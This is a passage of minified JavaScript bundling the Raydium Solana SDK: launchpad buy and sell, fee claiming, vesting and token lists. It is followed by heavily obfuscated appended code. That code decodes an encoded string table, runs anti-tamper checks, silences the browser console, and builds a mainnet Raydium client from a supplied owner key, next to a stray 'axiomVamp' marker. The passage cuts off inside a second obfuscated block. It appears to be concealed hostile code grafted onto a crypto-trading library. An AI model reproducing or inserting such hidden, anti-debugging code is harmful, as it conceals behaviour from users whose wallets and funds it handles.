            ? O.sizeCheckBuildV0({
                computeBudgetConfig: k,
                outAmount: J,
                splitIns: X,
                address: _A(SA({}, V), { poolId: N }),
              })
            : O.sizeCheckBuild({
                computeBudgetConfig: k,
                outAmount: J,
                splitIns: X,
                address: _A(SA({}, V), { poolId: N }),
              })
        );
      }
      async buyToken({
        programId: t = U_,
        authProgramId: e,
        mintA: n,
        mintB: r = xc,
        poolInfo: o,
        configInfo: i,
        platformFeeRate: s,
        txVersion: a,
        computeBudgetConfig: u,
        txTipConfig: c,
        feePayer: l,
        buyAmount: d,
        minMintAAmount: f,
        slippage: h,
        shareFeeRate: p = new Yn(0),
        shareFeeReceiver: m,
        associatedOnly: g = !0,
        checkCreateATAOwner: y = !1,
      }) {
        d.lte(new Yn(0)) &&
          this.logAndCreateError("buy amount should gt 0:", d.toString());
        let w = this.createTxBuilder(l),
          { publicKey: b } = $x(t, n, r);
        e = null != e ? e : Qx(t).publicKey;
        let v = null,
          A = null,
          k = r.equals(xc),
          { account: I, instructionParams: S } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: n,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !0,
              notUseTokenAccount: !1,
              associatedOnly: g,
              checkCreateATAOwner: y,
            });
        I && (v = I),
          w.addInstruction(S || {}),
          void 0 === v &&
            this.logAndCreateError(
              `cannot found mintA(${n.toBase58()}) token accounts`,
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let { account: _, instructionParams: T } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: r,
            owner: this.scope.ownerPubKey,
            createInfo: k
              ? { payer: this.scope.ownerPubKey, amount: d }
              : void 0,
            skipCloseAccount: !k,
            notUseTokenAccount: k,
            associatedOnly: !k && g,
            checkCreateATAOwner: y,
          });
        _ && (A = _),
          w.addInstruction(T || {}),
          void 0 === A &&
            this.logAndCreateError(
              `cannot found mintB(${r.toBase58()}) token accounts`,
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let B = o;
        if (!B) {
          let t = await this.scope.connection.getAccountInfo(b, {
            commitment: "processed",
          });
          t || this.logAndCreateError("cannot found pool:", b.toBase58()),
            (B = gP.decode(t.data));
        }
        let C = i,
          E = await MA(
            this.scope.connection,
            [C ? void 0 : B.configId, s ? void 0 : B.platformId]
              .filter(Boolean)
              .map((t) => ({ pubkey: t }))
          );
        if (!C) {
          let t = E.find((t) => t.pubkey.equals(B.configId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError("config not found: ", B.configId.toBase58()),
            (C = pP.decode(t.accountInfo.data));
        }
        if (!s) {
          let t = E.find((t) => t.pubkey.equals(B.platformId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError(
              "platform info not found: ",
              B.configId.toBase58()
            ),
            (s = yP.decode(t.accountInfo.data).feeRate);
        }
        let x = IP.buyExactIn({
            poolInfo: B,
            amountB: d,
            protocolFeeRate: C.tradeFeeRate,
            platformFeeRate: s,
            curveType: C.curveType,
            shareFeeRate: p,
          }),
          P = new bI(x.amountA.toString()),
          O = h
            ? new bI(_P.sub(h).toNumber() / _P.toNumber()).clampedTo(0, 1)
            : new bI(1),
          R = null != f ? f : h ? new Yn(P.mul(O).toFixed(0)) : x.amountA;
        x.amountB.lt(d), 0;
        let M = m ? y_(m, r, Bc).publicKey : void 0;
        return (
          M &&
            w.addInstruction({
              instructions: [Al(this.scope.ownerPubKey, M, m, r)],
            }),
          w.addInstruction({
            instructions: [
              aP(
                t,
                this.scope.ownerPubKey,
                e,
                B.configId,
                B.platformId,
                b,
                v,
                A,
                B.vaultA,
                B.vaultB,
                n,
                r,
                Bc,
                Bc,
                x.amountB.lt(d) ? x.amountB : d,
                R,
                p,
                M
              ),
            ],
          }),
          w.addCustomComputeBudget(u),
          w.addTipInstruction(c),
          w.versionBuild({ txVersion: a, extInfo: { outAmount: R } })
        );
      }
      async sellToken({
        programId: t = U_,
        authProgramId: e,
        mintA: n,
        mintB: r = xc,
        poolInfo: o,
        configInfo: i,
        platformFeeRate: s,
        txVersion: a,
        computeBudgetConfig: u,
        txTipConfig: c,
        feePayer: l,
        sellAmount: d,
        minAmountB: f,
        slippage: h,
        shareFeeRate: p = new Yn(0),
        shareFeeReceiver: m,
        associatedOnly: g = !0,
        checkCreateATAOwner: y = !1,
      }) {
        e = null != e ? e : Qx(t).publicKey;
        let w = this.createTxBuilder(l);
        d.lte(new Yn(0)) &&
          this.logAndCreateError("sell amount should be gt 0");
        let { publicKey: b } = $x(t, n, r),
          v = null,
          A = null,
          k = r.equals(xc),
          { account: I, instructionParams: S } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: n,
              owner: this.scope.ownerPubKey,
              createInfo: void 0,
              skipCloseAccount: !0,
              notUseTokenAccount: !1,
              associatedOnly: g,
              checkCreateATAOwner: y,
            });
        I && (v = I),
          w.addInstruction(S || {}),
          void 0 === v &&
            this.logAndCreateError(
              "cannot found mintA token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let { account: _, instructionParams: T } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: r,
            owner: this.scope.ownerPubKey,
            createInfo: k
              ? { payer: this.scope.ownerPubKey, amount: 0 }
              : void 0,
            skipCloseAccount: !k,
            notUseTokenAccount: k,
            associatedOnly: !k && g,
            checkCreateATAOwner: y,
          });
        _ && (A = _),
          w.addInstruction(T || {}),
          void 0 === A &&
            this.logAndCreateError(
              "cannot found mintB token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let B = o;
        if (!B) {
          let t = await this.scope.connection.getAccountInfo(b, {
            commitment: "processed",
          });
          t || this.logAndCreateError("cannot found pool", b.toBase58()),
            (B = gP.decode(t.data));
        }
        let C = i,
          E = await MA(
            this.scope.connection,
            [C ? void 0 : B.configId, s ? void 0 : B.platformId]
              .filter(Boolean)
              .map((t) => ({ pubkey: t }))
          );
        if (!C) {
          let t = E.find((t) => t.pubkey.equals(B.configId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError("config not found: ", B.configId.toBase58()),
            (C = pP.decode(t.accountInfo.data));
        }
        if (!s) {
          let t = E.find((t) => t.pubkey.equals(B.platformId));
          (!t || !t.accountInfo) &&
            this.logAndCreateError(
              "platform info not found: ",
              B.configId.toBase58()
            ),
            (s = yP.decode(t.accountInfo.data).feeRate);
        }
        let x = IP.sellExactIn({
            poolInfo: B,
            amountA: d,
            protocolFeeRate: C.tradeFeeRate,
            platformFeeRate: s,
            curveType: C.curveType,
            shareFeeRate: p,
          }),
          P = new bI(x.amountB.toString()),
          O = h
            ? new bI(_P.sub(h).toNumber() / _P.toNumber()).clampedTo(0, 1)
            : new bI(1),
          R = null != f ? f : h ? new Yn(P.mul(O).toFixed(0)) : x.amountB;
        R.lte(new Yn(0)) &&
          this.logAndCreateError(`out ${r.toBase58()} amount should be gt 0`);
        let M = m ? y_(m, r, Bc).publicKey : void 0;
        return (
          M &&
            w.addInstruction({
              instructions: [Al(this.scope.ownerPubKey, M, m, r)],
            }),
          w.addInstruction({
            instructions: [
              uP(
                t,
                this.scope.ownerPubKey,
                e,
                B.configId,
                B.platformId,
                b,
                v,
                A,
                B.vaultA,
                B.vaultB,
                n,
                r,
                Bc,
                Bc,
                x.amountA.lt(d) ? x.amountA : d,
                R,
                p,
                M
              ),
            ],
          }),
          w.addCustomComputeBudget(u),
          w.addTipInstruction(c),
          w.versionBuild({ txVersion: a, extInfo: { outAmount: R } })
        );
      }
      async createPlatformConfig({
        programId: t = U_,
        platformAdmin: e,
        platformClaimFeeWallet: n,
        platformLockNftWallet: r,
        cpConfigId: o,
        migrateCpLockNftScale: i,
        feeRate: s,
        name: a,
        web: u,
        img: c,
        txVersion: l,
        computeBudgetConfig: d,
        txTipConfig: f,
        feePayer: h,
      }) {
        let p = this.createTxBuilder(h),
          { publicKey: m } = rP(t, e);
        return (
          p.addInstruction({
            instructions: [fP(t, e, n, r, m, o, i, s, a, u, c)],
          }),
          p.addCustomComputeBudget(d),
          p.addTipInstruction(f),
          p.versionBuild({ txVersion: l, extInfo: { platformId: m } })
        );
      }
      async updatePlatformConfig({
        programId: t = U_,
        platformAdmin: e,
        platformId: n,
        updateInfo: r,
        txVersion: o,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a),
          c = null != n ? n : rP(t, e).publicKey;
        return (
          u.addInstruction({ instructions: [hP(t, e, c, r)] }),
          u.addCustomComputeBudget(i),
          u.addTipInstruction(s),
          u.versionBuild({ txVersion: o })
        );
      }
      async claimPlatformFee({
        programId: t = U_,
        authProgramId: e,
        platformId: n,
        poolId: r,
        platformClaimFeeWallet: o,
        mintB: i,
        vaultB: s,
        mintBProgram: a = Bc,
        txVersion: u,
        computeBudgetConfig: c,
        txTipConfig: l,
        feePayer: d,
      }) {
        var f;
        let h = this.createTxBuilder(d);
        e = null != e ? e : Qx(t).publicKey;
        let p = i,
          m = s;
        if (!p) {
          let t = await this.scope.connection.getAccountInfo(r, {
            commitment: "processed",
          });
          t || this.logAndCreateError("cannot found pool:", r.toBase58());
          let e = gP.decode(t.data),
            n = await this.scope.connection.getAccountInfo(e.configId, {
              commitment: "processed",
            });
          n ||
            this.logAndCreateError(
              "cannot found config:",
              e.configId.toBase58()
            ),
            (p = pP.decode(n.data).mintB),
            (m = null != m ? m : e.vaultB);
        }
        (!p || !m) &&
          this.logAndCreateError(
            "cannot found mint info, mintB: ",
            p.toBase58(),
            ", vaultB: ",
            null != (f = null == m ? void 0 : m.toBase58()) ? f : ""
          );
        let g = y_(this.scope.ownerPubKey, p, Bc).publicKey;
        return (
          h.addInstruction({
            instructions: [
              Al(this.scope.ownerPubKey, g, this.scope.ownerPubKey, p),
            ],
          }),
          h.addInstruction({ instructions: [dP(t, o, e, r, n, m, g, p, a)] }),
          h.addCustomComputeBudget(c),
          h.addTipInstruction(l),
          h.versionBuild({ txVersion: u })
        );
      }
      async claimAllPlatformFee({
        programId: t = U_,
        authProgramId: e,
        platformId: n,
        platformClaimFeeWallet: r,
        txVersion: o,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a);
        return (
          (e = null != e ? e : Qx(t).publicKey),
          (
            await this.scope.connection.getProgramAccounts(t, {
              filters: [
                { dataSize: gP.span },
                {
                  memcmp: {
                    offset: gP.offsetOf("platformId"),
                    bytes: n.toString(),
                  },
                },
              ],
            })
          ).forEach((o) => {
            let i = gP.decode(o.account.data),
              s = y_(this.scope.ownerPubKey, i.mintB, Bc).publicKey;
            u.addInstruction({
              instructions: [
                Al(this.scope.ownerPubKey, s, this.scope.ownerPubKey, i.mintB),
              ],
            }),
              u.addInstruction({
                instructions: [
                  dP(t, r, e, o.pubkey, n, i.vaultB, s, i.mintB, Bc),
                ],
              });
          }),
          u.addTipInstruction(s),
          0 === o
            ? u.sizeCheckBuildV0({ computeBudgetConfig: i })
            : u.sizeCheckBuild({ computeBudgetConfig: i })
        );
      }
      async createVesting({
        programId: t = U_,
        poolId: e,
        beneficiary: n,
        shareAmount: r,
        txVersion: o,
        computeBudgetConfig: i,
        txTipConfig: s,
        feePayer: a,
      }) {
        let u = this.createTxBuilder(a),
          c = oP(t, e, n).publicKey;
        return (
          u.addInstruction({
            instructions: [lP(t, this.scope.ownerPubKey, n, e, c, r)],
          }),
          u.addCustomComputeBudget(i),
          u.addTipInstruction(s),
          u.versionBuild({ txVersion: o })
        );
      }
      async claimVesting({
        programId: t = U_,
        poolId: e,
        poolInfo: n,
        txVersion: r,
        computeBudgetConfig: o,
        txTipConfig: i,
        feePayer: s,
        associatedOnly: a = !0,
        checkCreateATAOwner: u = !1,
      }) {
        let c = this.createTxBuilder(s),
          l = Qx(t).publicKey,
          d = oP(t, e, this.scope.ownerPubKey).publicKey,
          f = n;
        if (!f) {
          let t = await this.scope.connection.getAccountInfo(e);
          t || this.logAndCreateError("pool not found"),
            (f = gP.decode(t.data));
        }
        let h = y_(this.scope.ownerPubKey, f.mintA, Bc).publicKey;
        return (
          c.addInstruction({
            instructions: [
              Al(this.scope.ownerPubKey, h, this.scope.ownerPubKey, f.mintA),
            ],
          }),
          c.addInstruction({
            instructions: [
              cP(t, this.scope.ownerPubKey, l, e, d, h, f.vaultA, f.mintA, Bc),
            ],
          }),
          c.addCustomComputeBudget(o),
          c.addTipInstruction(i),
          c.versionBuild({ txVersion: r })
        );
      }
      async getRpcPoolInfo({ poolId: t }) {
        return (await this.getRpcPoolsInfo({ poolIdList: [t] })).poolInfoMap[
          t.toBase58()
        ];
      }
      async getRpcPoolsInfo({ poolIdList: t, config: e }) {
        let n = await MA(
            this.scope.connection,
            t.map((t) => ({ pubkey: t })),
            e
          ),
          r = {},
          o = [];
        for (let a = 0; a < t.length; a++) {
          let e = n[a];
          if (null === e || !e.accountInfo)
            throw Error("fetch pool info error: " + t[a].toBase58());
          let i = gP.decode(e.accountInfo.data);
          (r[t[a].toBase58()] = _A(SA({}, i), { poolId: e.accountInfo.owner })),
            o.push(i.configId);
        }
        let i = await MA(
            this.scope.connection,
            o.map((t) => ({ pubkey: t })),
            e
          ),
          s = {};
        for (let a = 0; a < o.length; a++) {
          let t = i[a];
          if (null === t || !t.accountInfo)
            throw Error("fetch config info error: " + o[a].toBase58());
          let e = pP.decode(t.accountInfo.data);
          s[o[a].toBase58()] = _A(SA({}, e), { configId: t.accountInfo.owner });
        }
        return {
          poolInfoMap: Object.keys(r).reduce(
            (t, e) =>
              _A(SA({}, t), {
                [e]: _A(SA({}, r[e]), {
                  configInfo: s[r[e].configId.toBase58()],
                }),
              }),
            {}
          ),
        };
      }
    },
    BP = class extends cT {
      constructor(t) {
        super(t),
          (this._tokenList = []),
          (this._tokenMap = new Map()),
          (this._blackTokenMap = new Set()),
          (this._mintGroup = {
            official: new Set(),
            jup: new Set(),
            extra: new Set(),
          }),
          (this._whiteMap = new Set()),
          (this._extraTokenList = []);
      }
      async load(t) {
        this.checkDisabled();
        let { forceUpdate: e = !1, type: n = "strict" } = t || {},
          {
            mintList: r,
            blacklist: o,
            whiteList: i,
          } = await this.scope.fetchV3TokenList(e),
          s = await this.scope.fetchJupTokenList(e);
        (this._tokenList = []),
          (this._tokenMap = new Map()),
          (this._blackTokenMap = new Set(o)),
          (this._mintGroup = {
            official: new Set(),
            jup: new Set(),
            extra: new Set(),
          }),
          (this._whiteMap = new Set(i)),
          this._tokenMap.set(RI.address, RI),
          this._mintGroup.official.add(RI.address),
          r.forEach((t) => {
            var e;
            this._blackTokenMap.has(t.address) ||
              (this._tokenMap.set(
                t.address,
                _A(SA({}, t), {
                  type: "raydium",
                  priority: 2,
                  programId:
                    null != (e = t.programId)
                      ? e
                      : t.tags.includes("token-2022")
                      ? Cc.toBase58()
                      : Bc.toBase58(),
                })
              ),
              this._mintGroup.official.add(t.address));
          }),
          s.forEach((t) => {
            var e;
            this._blackTokenMap.has(t.address) ||
              this._tokenMap.has(t.address) ||
              (this._tokenMap.set(
                t.address,
                _A(SA({}, t), {
                  type: "jupiter",
                  priority: 1,
                  programId:
                    null != (e = t.programId)
                      ? e
                      : t.tags.includes("token-2022")
                      ? Cc.toBase58()
                      : Bc.toBase58(),
                  tags: t.freezeAuthority
                    ? [...(t.tags || []), "hasFreeze"]
                    : t.tags,
                })
              ),
              this._mintGroup.jup.add(t.address));
          }),
          this._extraTokenList.forEach((t) => {
            this._blackTokenMap.has(t.address) ||
              this._tokenMap.has(t.address) ||
              (this._tokenMap.set(
                t.address,
                _A(SA({}, t), {
                  type: "extra",
                  priority: 1,
                  programId:
                    t.programId || t.tags.includes("token-2022")
                      ? Cc.toBase58()
                      : Bc.toBase58(),
                })
              ),
              this._mintGroup.extra.add(t.address));
          }),
          (this._tokenList = Array.from(this._tokenMap).map((t) => t[1]));
      }
      get tokenList() {
        return this._tokenList;
      }
      get tokenMap() {
        return this._tokenMap;
      }
      get blackTokenMap() {
        return this._blackTokenMap;
      }
      get mintGroup() {
        return this._mintGroup;
      }
      get whiteListMap() {
        return this._whiteMap;
      }
      async getTokenInfo(t) {
        if (!t) throw new Error("please input mint");
        let e = t.toString(),
          n = this._tokenMap.get(e);
        if (n) return n;
        if ("SOL" === e.toLocaleUpperCase()) return RI;
        let r = (await this.scope.api.getTokenInfo([e]))[0];
        if (r)
          return (
            this._mintGroup.extra.add(e),
            this._tokenMap.set(e, _A(SA({}, r), { priority: 2 })),
            r
          );
        let o = await this.scope.connection.getAccountInfo(new Ji(e));
        if (!o) throw new Error(`mint address not found: ${e}`);
        let i = dl.decode(o.data),
          s = e.toString().substring(0, 6),
          a = {
            chainId: 101,
            address: e,
            programId: o.owner.toBase58(),
            logoURI: "",
            symbol: s,
            name: s,
            decimals: i.decimals,
            tags: [],
            extensions: {},
            priority: 0,
            type: "unknown",
          };
        return this._mintGroup.extra.add(e), this._tokenMap.set(e, a), a;
      }
    },
    CP = class {
      constructor(t) {
        this.rawBalances = new Map();
        let {
          connection: e,
          cluster: n,
          owner: r,
          api: o,
          defaultChainTime: i,
          defaultChainTimeOffset: s,
          apiCacheTime: a,
          blockhashCommitment: u = "confirmed",
          loopMultiTxStatus: c,
        } = t;
        (this._connection = e),
          (this.cluster = n || "mainnet"),
          (this._owner = r ? new dS(r) : void 0),
          (this._signAllTransactions = t.signAllTransactions),
          (this.blockhashCommitment = u),
          (this.loopMultiTxStatus = c),
          (this.api = o),
          (this._apiCacheTime = a || 3e5),
          (this.logger = PA("Raydium")),
          (this.farm = new jB({ scope: this, moduleName: "Raydium_Farm" })),
          (this.account = new oB({
            scope: this,
            moduleName: "Raydium_Account",
            tokenAccounts: t.tokenAccounts,
            tokenAccountRawInfos: t.tokenAccountRawInfos,
          })),
          (this.liquidity = new YE({
            scope: this,
            moduleName: "Raydium_LiquidityV2",
          })),
          (this.token = new BP({ scope: this, moduleName: "Raydium_tokenV2" })),
          (this.tradeV2 = new Ux({
            scope: this,
            moduleName: "Raydium_tradeV2",
          })),
          (this.clmm = new QE({ scope: this, moduleName: "Raydium_clmm" })),
          (this.cpmm = new Cx({ scope: this, moduleName: "Raydium_cpmm" })),
          (this.utils1216 = new zx({
            scope: this,
            moduleName: "Raydium_utils1216",
          })),
          (this.marketV2 = new JE({
            scope: this,
            moduleName: "Raydium_marketV2",
          })),
          (this.ido = new Gx({ scope: this, moduleName: "Raydium_ido" })),
          (this.launchpad = new TP({
            scope: this,
            moduleName: "Raydium_lauchpad",
          })),
          (this.availability = {});
        let l = new Date().getTime();
        (this.apiData = {}),
          s &&
            (this._chainTime = {
              fetched: l,
              value: { chainTime: i || Date.now() - s, offset: s },
            });
      }
      static async load(t) {
        var e;
        let n = kv.merge(
            {
              cluster: "mainnet",
              owner: null,
              apiRequestInterval: 3e5,
              apiRequestTimeout: 1e4,
            },
            t
          ),
          {
            cluster: r,
            apiRequestTimeout: o,
            logCount: i,
            logRequests: s,
            urlConfigs: a,
          } = n,
          u = new sT({
            cluster: r,
            timeout: o,
            urlConfigs: a,
            logCount: i,
            logRequests: s,
          }),
          c = new CP(_A(SA({}, n), { api: u }));
        return (
          await c.fetchAvailabilityStatus(
            null == (e = t.disableFeatureCheck) || e
          ),
          t.disableLoadToken || (await c.token.load({ type: t.jupTokenType })),
          c
        );
      }
      get owner() {
        return this._owner;
      }
      get ownerPubKey() {
        if (!this._owner) throw new Error(aT);
        return this._owner.publicKey;
      }
      setOwner(t) {
        return (
          (this._owner = t ? new dS(t) : void 0),
          this.account.resetTokenAccounts(),
          this
        );
      }
      get connection() {
        if (!this._connection)
          throw new Error(
            "please provide connection in load() initialization or set it by raydium.setConnection(connection)"
          );
        return this._connection;
      }
      setConnection(t) {
        return (this._connection = t), this;
      }
      get signAllTransactions() {
        return this._signAllTransactions;
      }
      setSignAllTransactions(t) {
        return (this._signAllTransactions = t), this;
      }
      checkOwner() {
        if (!this.owner) throw (void 0, new Error(aT));
      }
      isCacheInvalidate(t) {
        return new Date().getTime() - t > this._apiCacheTime;
      }
      async fetchChainTime() {
        try {
          let t = await this.api.getChainTimeOffset();
          this._chainTime = {
            fetched: Date.now(),
            value: {
              chainTime: Date.now() + 1e3 * t.offset,
              offset: 1e3 * t.offset,
            },
          };
        } catch {
          this._chainTime = void 0;
        }
      }
      async fetchV3TokenList(t) {
        if (
          this.apiData.tokenList &&
          !this.isCacheInvalidate(this.apiData.tokenList.fetched) &&
          !t
        )
          return this.apiData.tokenList.data;
        try {
          let t = await this.api.getTokenList(),
            e = { fetched: Date.now(), data: t };
          return (this.apiData.tokenList = e), e.data;
        } catch (lS) {
          return void 0, { mintList: [], blacklist: [], whiteList: [] };
        }
      }
      async fetchJupTokenList(t) {
        let e = this.apiData.jupTokenList;
        if (e && !this.isCacheInvalidate(e.fetched) && !t) return e.data;
        try {
          let t = await this.api.getJupTokenList();
          return (
            (this.apiData.jupTokenList = {
              fetched: Date.now(),
              data: t.map((t) =>
                _A(SA({}, t), {
                  mintAuthority: t.mint_authority || void 0,
                  freezeAuthority: t.freeze_authority || void 0,
                })
              ),
            }),
            this.apiData.jupTokenList.data
          );
        } catch (LA) {
          return void 0, [];
        }
      }
      get chainTimeData() {
        var t;
        return null == (t = this._chainTime) ? void 0 : t.value;
      }
      async chainTimeOffset() {
        var t;
        return this._chainTime && Date.now() - this._chainTime.fetched <= 3e5
          ? this._chainTime.value.offset
          : (await this.fetchChainTime(),
            (null == (t = this._chainTime) ? void 0 : t.value.offset) || 0);
      }
      async currentBlockChainTime() {
        var t;
        return this._chainTime && Date.now() - this._chainTime.fetched <= 3e5
          ? this._chainTime.value.chainTime
          : (await this.fetchChainTime(),
            (null == (t = this._chainTime) ? void 0 : t.value.chainTime) ||
              Date.now());
      }
      async fetchEpochInfo() {
        return (
          (this._epochInfo && Date.now() - this._epochInfo.fetched <= 3e4) ||
            (this._epochInfo = {
              fetched: Date.now(),
              value: await this.connection.getEpochInfo(),
            }),
          this._epochInfo.value
        );
      }
      async fetchAvailabilityStatus(t) {
        if (t) return {};
        try {
          let t = await this.api.fetchAvailabilityStatus(),
            e = !1 === t.all;
          return (
            (this.availability = {
              all: t.all,
              swap: !e && t.swap,
              createConcentratedPosition: !e && t.createConcentratedPosition,
              addConcentratedPosition: !e && t.addConcentratedPosition,
              addStandardPosition: !e && t.addStandardPosition,
              removeConcentratedPosition: !e && t.removeConcentratedPosition,
              removeStandardPosition: !e && t.removeStandardPosition,
              addFarm: !e && t.addFarm,
              removeFarm: !e && t.removeFarm,
            }),
            t
          );
        } catch {
          return {};
        }
      }
    };
  function EP(t, e) {
    const n = MP();
    return (
      (EP = function (e, r) {
        let o = n[(e -= 347)];
        if (void 0 === EP.GuMRQx) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (EP.apQmvu = i), (t = arguments), (EP.GuMRQx = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.tEkKSL = t),
              (this.HSjkzq = [1, 0, 0]),
              (this.uUeQEk = function () {
                return "newState";
              }),
              (this.eSeVBo = "\\w+ *\\(\\) *{\\w+ *"),
              (this.TUuLty = "['|\"].+['|\"];? *}");
          };
          (e.prototype.mDKKNr = function () {
            const t = new RegExp(this.eSeVBo + this.TUuLty).test(
              this.uUeQEk.toString()
            )
              ? --this.HSjkzq[1]
              : --this.HSjkzq[0];
            return this.VWMaUz(t);
          }),
            (e.prototype.VWMaUz = function (t) {
              return Boolean(~t) ? this.XxbKgn(this.tEkKSL) : t;
            }),
            (e.prototype.XxbKgn = function (t) {
              for (let e = 0, n = this.HSjkzq.length; e < n; e++)
                this.HSjkzq.push(Math.round(Math.random())),
                  (n = this.HSjkzq.length);
              return t(this.HSjkzq[0]);
            }),
            new e(EP).mDKKNr(),
            (o = EP.apQmvu(o)),
            (t[s] = o);
        }
        return o;
      }),
      EP(t, e)
    );
  }
  !(function (t) {
    const e = 372,
      n = 376,
      r = 354,
      o = 350,
      i = 370,
      s = 361,
      a = 364,
      u = 358,
      c = EP,
      l = t();
    for (; []; )
      try {
        if (
          101682 ===
          (-parseInt(c(e)) / 1) * (parseInt(c(n)) / 2) +
            (parseInt(c(362)) / 3) * (parseInt(c(366)) / 4) +
            -parseInt(c(r)) / 5 +
            (-parseInt(c(o)) / 6) * (-parseInt(c(i)) / 7) +
            parseInt(c(359)) / 8 +
            (-parseInt(c(s)) / 9) * (-parseInt(c(a)) / 10) +
            -parseInt(c(u)) / 11
        )
          break;
        l.push(l.shift());
      } catch (d) {
        l.push(l.shift());
      }
  })(MP);
  const xP = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    PP = xP(void 0, function () {
      const t = 368,
        e = EP,
        n = {};
      n[e(377)] = "(((.+)+)+)+$";
      const r = n;
      return PP.toString()
        .search("(((.+)+)+)+$")
        [e(356)]()
        [e(t) + "r"](PP)
        .search(r[e(377)]);
    });
  PP();
  const OP = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    RP = OP(void 0, function () {
      const t = 360,
        e = 367,
        n = 378,
        r = 355,
        o = 347,
        i = 351,
        s = 352,
        a = 371,
        u = 353,
        c = 375,
        l = 348,
        d = EP,
        f = {
          CFprQ: function (t, e) {
            return t(e);
          },
          vbkKX: function (t, e) {
            return t + e;
          },
          zBjSy: d(357) + d(t),
          jVAUM: d(374) + d(e) + 'rn this")( )',
          HFwUr: "log",
          nkbdb: d(n),
          ULsJK: d(r),
        };
      let h;
      try {
        h = f.CFprQ(Function, f.vbkKX(f[d(o)], f.jVAUM) + ");")();
      } catch (g) {
        h = window;
      }
      const p = (h.console = h[d(i)] || {}),
        m = [f[d(s)], "warn", f[d(a)], "error", d(u), f.ULsJK, "trace"];
      for (let y = 0; y < m[d(365)]; y++) {
        const t = OP.constructor.prototype[d(c)](OP),
          e = m[y],
          n = p[e] || t;
        (t[d(l)] = OP.bind(OP)),
          (t.toString = n[d(356)][d(375)](n)),
          (p[e] = t);
      }
    });
  function MP() {
    const t = [
      "yMLUza",
      "mtr1vxPPuKC",
      "sfbjrvu",
      "Aw5MBW",
      "EKjQu3K",
      "x19WCM90B19F",
      "B3DUzxi",
      "mZbxuxPZv3i",
      "y29UC29Szq",
      "sez3vxi",
      "zxHJzxb0Aw9U",
      "mZaYnZCWAhPMq01I",
      "DgfIBgu",
      "Dg9tDhjPBMC",
      "CMv0DxjUicHMDq",
      "nti5ndG1z0zZt1fh",
      "ndmXotjZteH1uNG",
      "BMn0Aw9UkcKG",
      "mJDcwMfMrM8",
      "mtKYwhfUwejg",
      "B21TAxrTzw50",
      "mtyYmdyWAxDIDuPS",
      "BgvUz3rO",
      "mti0mtzAC09hv1u",
      "y3rVCIGICMv0Dq",
      "y29UC3rYDwn0BW",
      "yMXVy2TOyxnOqW",
      "mJi0mJfKz0P3zve",
      "BMTIzgi",
      "odmZmvr0AgfSAa",
      "Bg9Hza",
      "E30Uy29UC3rYDq",
    ];
    return (MP = function () {
      return t;
    })();
  }
  RP(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const LP = async (t, e, n) => {
    const r = 369,
      o = 363,
      i = 373,
      s = EP,
      a = { uDnrf: "mainnet", yFHcK: "confirmed" },
      u = a,
      c = {};
    (c[s(349)] = t),
      (c.connection = e),
      (c.cluster = u.uDnrf),
      (c.disableFeatureCheck = !![]),
      (c.disableLoadToken = !0),
      (c[s(r) + s(o)] = u.yFHcK);
    return await CP[s(i)](c);
  };
  axiomVamp;
  const NP = WP;
  !(function (t) {
    const e = 398,
      n = 392,
      r = 369,
      o = 410,
      i = 370,
      s = 406,
      a = 419,
      u = 443,
      c = 445,
      l = WP,
      d = t();
    for (; []; )
      try {
        if (
          574526 ===
          (parseInt(l(e)) / 1) * (-parseInt(l(378)) / 2) +
            (-parseInt(l(400)) / 3) * (-parseInt(l(391)) / 4) +
            -parseInt(l(n)) / 5 +
            (parseInt(l(r)) / 6) * (-parseInt(l(o)) / 7) +
            (parseInt(l(i)) / 8) * (parseInt(l(s)) / 9) +
            -parseInt(l(a)) / 10 +
            (-parseInt(l(u)) / 11) * (-parseInt(l(c)) / 12)
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(KP);
  const DP = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    UP = DP(void 0, function () {
      return UP.toString()
        .search("(((.+)+)+)+$")
        .toString()
        .constructor(UP)
        .search("(((.+)+)+)+$");
    });
  UP();
  const qP = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    zP = qP(void 0, function () {
